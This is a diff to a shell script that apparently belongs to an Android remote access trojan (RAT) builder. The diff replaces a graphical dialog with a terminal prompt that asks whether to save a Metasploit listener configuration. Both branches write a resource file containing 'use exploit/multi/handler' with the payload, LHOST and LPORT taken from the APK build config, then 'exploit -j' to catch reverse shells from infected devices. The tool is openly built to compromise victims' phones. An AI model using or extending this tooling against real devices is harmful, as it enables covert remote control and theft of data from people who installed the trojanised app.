@@ -618,10 +618,33 @@ echo "Your RAT apk was successfully builded and signed , it is located here :
 rm -rf temp/* > /dev/null 2>&1
 echo ""
 fi
-zenity --question --text="`printf "Do you want to create a listener for this configuration \n to use in msfconsole in future ?"`"
-if [ $? = 0 ] ; then
-save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="myapk");
-svf=$path/config/listeners/$save.rc
+echo -e $okegreen "Do you want to create a listener for this configuration"
+echo -e $okegreen "to use in msfconsole in future ?"
+echo ""
+echo -ne $cyan "Choose y/n : "
+read sel
+case $sel in
+y|Y|Yes|yes|YES)
+echo ""
+echo -e $green "Write the name for this config . (ex : myratapk)"
+echo -ne "Filename : ";tput sgr0
+read fname
+if [ -z $fname ]
+then
+svf=$path/config/listeners/myratapk.rc
+rm -rf $svf >/dev/null 2>&1
+payloads=`sed -n 3p $apkconf`
+yourip=`sed -n 4p $apkconf`
+yourport=`sed -n 5p $apkconf`
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD $payloads" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit -j" >> $svf
+echo -e $green ""
+echo "Configuration file saved to $list/myratapk.rc"
+else
+svf=$path/config/listeners/$fname.rc
 rm -rf $svf >/dev/null 2>&1
 payloads=`sed -n 3p $apkconf`
 yourip=`sed -n 4p $apkconf`
@@ -632,5 +655,20 @@ echo "set LHOST $yourip" >> $svf
 echo "set LPORT $yourport" >> $svf
 echo "exploit -j" >> $svf
 echo -e $blue ""
-echo "Configuration file saved to $list/$save.rc"
+echo "Configuration file saved to $list/$fname.rc"
 fi
+echo -e $green ""
+read -rsp $'Press [ENTER] key to continue\n' -n 1 key
+clear
+;;
+n|no|No|NO)
+echo -e $green ""
+read -rsp $'Press [ENTER] key to continue\n' -n 1 key
+clear
+;;
+*)
+echo -e $green ""
+read -rsp $'Press [ENTER] key to continue\n' -n 1 key
+clear
+;;
+esac
